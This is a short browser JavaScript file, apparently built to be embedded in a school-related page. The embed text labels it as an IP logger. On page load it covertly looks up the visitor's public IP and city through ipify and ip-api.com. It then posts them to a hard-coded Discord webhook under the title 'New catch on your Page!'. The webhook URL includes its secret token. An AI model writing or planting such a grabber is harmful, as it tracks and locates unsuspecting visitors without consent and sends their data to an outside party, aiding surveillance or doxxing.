function sendIPToDiscord(ipAddress, location, device) {
    const webhookURL = "https://discord.com/api/webhooks/1163031346214600727/_kIeBViIzydspGZF8BT6OuSdxOFLh3XkKqJCOAUwciqgYCV5DYqKRCtRGQvB8ItbQnnQ";

    const embedData = {
        color: 098255,
        author: {
            name: "IP Logging (edu page) - Wiebren",
            icon_url: "https://media.discordapp.net/attachments/1157987906741338203/1157988095577313290/e8e828e011b97b24f1956b0d7292709d.png?ex=6534f9f4&is=652284f4&hm=d87505f44ed378164813cdf3b9027fbf179795f90ada50d869337727716e1110&=&width=192&height=192"
        },
        title: "New catch on your Page!",
        description: `**IP Address:**\n> ${ipAddress}\n**Location:**\n> ${location}\n**Device:**\n> ${device}`,
    };

    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({ embeds: [embedData] }),
    });
}

async function getLocationFromIP(ipAddress) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ipAddress}`);
        const data = await response.json();
        return data.city ? `${data.country}, ${data.city}` : data.country;
    } catch (error) {
        console.error("Error fetching location data:", error);
        return "Unknown";
    }
}

function getDeviceInfo() {
    return "Desktop";
}

window.addEventListener("load", async () => {
    try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        const ipAddress = data.ip;

        const location = await getLocationFromIP(ipAddress);
        const device = getDeviceInfo();

        sendIPToDiscord(ipAddress, location, device);
    } catch (error) {
        console.error("Error fetching IP address:", error);
    }
});
